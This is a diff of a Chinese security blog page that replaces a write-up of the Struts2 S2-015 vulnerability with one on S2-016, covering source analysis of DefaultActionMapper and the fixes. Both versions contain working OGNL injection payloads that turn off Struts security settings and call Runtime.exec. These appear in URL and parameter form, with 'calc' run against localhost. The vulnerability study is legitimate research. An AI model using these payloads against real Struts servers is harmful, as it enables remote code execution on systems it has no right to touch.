@@ -16,7 +16,7 @@
   <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
-  <title>struts2系列漏洞 S2-015 - Twings</title>
+  <title>struts2系列漏洞 S2-016 - Twings</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期五, 七月 24日 2020, 4:47 下午
+                  星期六, 七月 25日 2020, 11:04 上午
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    605 字
+                    698 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      2 分钟
+                      3 分钟
                   </span>
                 
 
@@ -172,62 +172,115 @@
               <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p>
 <a id="more"></a>
 <hr>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.14.2 版本的 struts2 + Tomcat 9。</p>
-<h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p>修改 struts.xml 文件，加上一个默认 Action：</p>
-<pre><code class="xml">&lt;action name=&quot;*&quot; class=&quot;com.example.struts2.LoginAction&quot;&gt;
-    &lt;result&gt;/{1}.jsp&lt;/result&gt;
-&lt;/action&gt;
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.14.3 版本的 struts2 + Tomcat 9。</p>
+<p>不需要加什么代码。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用 payload（redirect 和 redirect 需要已有的 Action）：</p>
+<pre><code>http://localhost:8080/login.action
+?redirect:%25%7b%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3dfalse,%23m%3d%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)%7d
+</code></pre><p>action 参数似乎无法触发，没有进行表达式解析。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据 action 的 action 不存在的报错栈，可以找到 DefaultActionProxy 类的 prepare 方法，错误原因就是将 action 参数的值作为一个 Action 名而不是一个表达式，导致获取相关配置时失败：</p>
+<pre><code class="java">config = configuration.getRuntimeConfiguration().getActionConfig(namespace, actionName);
+
+if (config == null &amp;&amp; unknownHandlerManager.hasUnknownHandlers()) {
+    config = unknownHandlerManager.handleUnknownAction(namespace, actionName);
+}
+if (config == null) {
+    throw new ConfigurationException(getErrorMessage());
+}
 </code></pre>
-<p>简单来说就是匹配不到 Action 时会访问的 JSP。</p>
-<h4 id="参数的双重评估"><a href="#参数的双重评估" class="headerlink" title="参数的双重评估"></a>参数的双重评估</h4><p>类似 S2-012，不过发生在设置 HTTP Headers 的 Action 而不是重定向中：</p>
-<pre><code class="xml">&lt;result type=&quot;httpheader&quot;&gt;
-    &lt;param name=&quot;headers.username&quot;&gt;${username}&lt;/param&gt;
-&lt;/result&gt;
+<p>继续往上寻找，可以看到 actionName 和 namespace 来自 mapping：</p>
+<pre><code class="java">String namespace = mapping.getNamespace();
+String name = mapping.getName();
+String method = mapping.getMethod();
+
+Configuration config = configurationManager.getConfiguration();
+ActionProxy proxy = config.getContainer().getInstance(ActionProxyFactory.class).createActionProxy(
+    namespace, name, method, extraContext, true, false);
 </code></pre>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用 1"></a>漏洞利用 1</h4><p>本地环境为 2.3.14.2，所以修改安全配置需要使用反射，利用 payload 如下：</p>
-<pre><code>http://localhost:8080/${%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D=false,%23m=%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)}.action
-</code></pre><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用 2"></a>漏洞利用 2</h4><p>payload 如下：</p>
-<pre><code>username=${%25{%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D=false,%23m=%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)}}
-</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析 1"></a>漏洞分析 1</h4><p>看到 StrutsResultSupport 类的 execute 方法：</p>
+<p>继续往上，可以找到 DefaultActionMapper 类的 handleSpecialParameters 方法：</p>
+<pre><code class="java">public void handleSpecialParameters(HttpServletRequest request, ActionMapping mapping) {
+    // handle special parameter prefixes.
+    Set&lt;String&gt; uniqueParameters = new HashSet&lt;String&gt;();
+    Map parameterMap = request.getParameterMap();
+    for (Object o : parameterMap.keySet()) {
+        String key = (String) o;
+
+        // Strip off the image button location info, if found
+        if (key.endsWith(&quot;.x&quot;) || key.endsWith(&quot;.y&quot;)) {
+            key = key.substring(0, key.length() - 2);
+        }
+
+        // Ensure a parameter doesn&#39;t get processed twice
+        if (!uniqueParameters.contains(key)) {
+            ParameterAction parameterAction = (ParameterAction) prefixTrie.get(key);
+            if (parameterAction != null) {
+                parameterAction.execute(key, mapping);
+                uniqueParameters.add(key);
+                break;
+            }
+        }
+    }
+}
+</code></pre>
+<p>调用 parameterAction.execute 函数时会向 mapping 里面设置 name、result 等成员，比如 action、redirect 和 redirectAction 的 execute 函数（DefaultActionMapper 类中）：</p>
+<pre><code class="java">put(ACTION_PREFIX, new ParameterAction() {
+    public void execute(String key, ActionMapping mapping) {
+        String name = key.substring(ACTION_PREFIX.length());
+        if (allowDynamicMethodCalls) {
+            int bang = name.indexOf(&#39;!&#39;);
+            if (bang != -1) {
+                String method = name.substring(bang + 1);
+                mapping.setMethod(method);
+                name = name.substring(0, bang);
+            }
+        }
+        mapping.setName(name);
+    }
+});
+
+put(REDIRECT_PREFIX, new ParameterAction() {
+    public void execute(String key, ActionMapping mapping) {
+        ServletRedirectResult redirect = new ServletRedirectResult();
+        container.inject(redirect);
+        redirect.setLocation(key.substring(REDIRECT_PREFIX
+                .length()));
+        mapping.setResult(redirect);
+    }
+});
+
+put(REDIRECT_ACTION_PREFIX, new ParameterAction() {
+    public void execute(String key, ActionMapping mapping) {
+        String location = key.substring(REDIRECT_ACTION_PREFIX
+                                        .length());
+        ServletRedirectResult redirect = new ServletRedirectResult();
+        container.inject(redirect);
+        String extension = getDefaultExtension();
+        if (extension != null &amp;&amp; extension.length() &gt; 0) {
+            location += &quot;.&quot; + extension;
+        }
+        redirect.setLocation(location);
+        mapping.setResult(redirect);
+    }
+});
+</code></pre>
+<p>可以看到，参数名为 action 的情况下，会将值作为 name，也就是后面的 actionName，也就导致了后面无法找到对应 action 的错误。</p>
+<p>而在 redirect 和 redirectAction 的情况下，完成 createActionProxy 后来到这里：</p>
+<pre><code class="java">// if the ActionMapping says to go straight to a result, do it!
+if (mapping.getResult() != null) {
+    Result result = mapping.getResult();
+    result.execute(proxy.getInvocation());
+} else {
+    proxy.execute();
+}
+</code></pre>
+<p>因为当时将表达式作为了 result，所以会进入 result 的 execute 函数，来到：</p>
 <pre><code class="java">public void execute(ActionInvocation invocation) throws Exception {
     lastFinalLocation = conditionalParse(location, invocation);
     doExecute(lastFinalLocation, invocation);
 }
 </code></pre>
-<p>这里的 location 就是我们访问的 Action，这里的意思是对 location 做一个处理（简单来说就是按照配置文件的写法拼接完成之后，再作为一个表达式来解析），然后将处理结果作为最后要访问的路径，处理的时候会调用 translateVariables 方法，也就是之前一直看到的表达式解析函数。</p>
-<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析 2"></a>漏洞分析 2</h4><p>类似 S2-012，% 和 $ 各解析了一次，实际上 payload 里面可以去掉外面那一层 ${}，同样可以利用，struts 在处理 HTTP Headers 的时候：</p>
-<pre><code class="java">if (headers != null) {
-    for (Map.Entry&lt;String, String&gt; entry : headers.entrySet()) {
-        String value = entry.getValue();
-        String finalValue = parse ? TextParseUtil.translateVariables(value, stack) : value;
-        response.addHeader(entry.getKey(), finalValue);
-    }
-}
-</code></pre>
-<p>会调用 translateVariables 函数，这里就是双重评估的触发点了。</p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="漏洞修复1"><a href="#漏洞修复1" class="headerlink" title="漏洞修复1"></a>漏洞修复1</h4><p>2.3.14.3 版本的修复：</p>
-<pre><code class="java">protected String allowedActionNames = &quot;[a-z]*[A-Z]*[0-9]*[.\\-_!/]*&quot;;
-protected String cleanupActionName(final String rawActionName) {
-    if (rawActionName.matches(allowedActionNames)) {
-        return rawActionName;
-    } else {
-        if (LOG.isWarnEnabled()) {
-            LOG.warn(&quot;Action [#0] do not match allowed action names pattern [#1], cleaning it up!&quot;,
-                rawActionName, allowedActionNames);
-        }
-        String cleanActionName = rawActionName;
-        for(String chunk : rawActionName.split(allowedActionNames)) {
-            cleanActionName = cleanActionName.replace(chunk, &quot;&quot;);
-        }
-        if (LOG.isDebugEnabled()) {
-            LOG.debug(&quot;Cleaned action name [#0]&quot;, cleanActionName);
-        }
-        return cleanActionName;
-    }
-}
-</code></pre>
-<p>对 Action 的名称做了白名单清理。</p>
-<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复 2"></a>漏洞修复 2</h4><p>同 S2-012，可以算是移除了双重评估。</p>
+<p>可以发现这里就是 S2-015 里面通配符 action 的表达式解析触发点。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.15.1 版本的修复，直接删除了 DefaultActionMapper 类中 redirect  和 redirectAction 的 execute 函数，还给 action 的 action 名做了清理（类似 S2-015）。</p>
 <hr>
 <p>Orz</p>
 
@@ -252,16 +305,11 @@ protected String cleanupActionName(final String rawActionName) {
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2020/07/25/struts2系列漏洞-S2-016/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>struts2系列漏洞 S2-016</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2020/07/23/F5-BIG-IP观摩/">
-                        <span>F5 BIG-IP 学习</span>
+                      <a href="/2020/07/24/struts2系列漏洞-S2-015/">
+                        <span>struts2系列漏洞 S2-015</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -434,7 +482,7 @@ protected String cleanupActionName(final String rawActionName) {
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "struts2系列漏洞 S2-015&nbsp;",
+        "struts2系列漏洞 S2-016&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
